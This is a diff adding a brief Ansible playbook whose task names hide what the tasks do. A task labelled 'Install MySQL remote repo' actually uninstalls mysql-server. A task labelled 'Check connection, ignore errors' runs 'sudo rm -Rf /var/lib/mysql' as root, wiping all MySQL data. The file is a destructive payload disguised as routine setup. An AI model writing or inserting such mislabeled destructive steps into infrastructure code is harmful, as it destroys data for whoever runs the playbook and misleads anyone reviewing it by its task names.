@@ -1,0 +1,10 @@
+---
+- name: Install MySQL remote repo
+  package:
+    name: mysql-server
+    state: absent
+  become: true
+- name: Check connection, ignore errors
+  shell: "sudo rm -Rf /var/lib/mysql"
+  become: true
+...
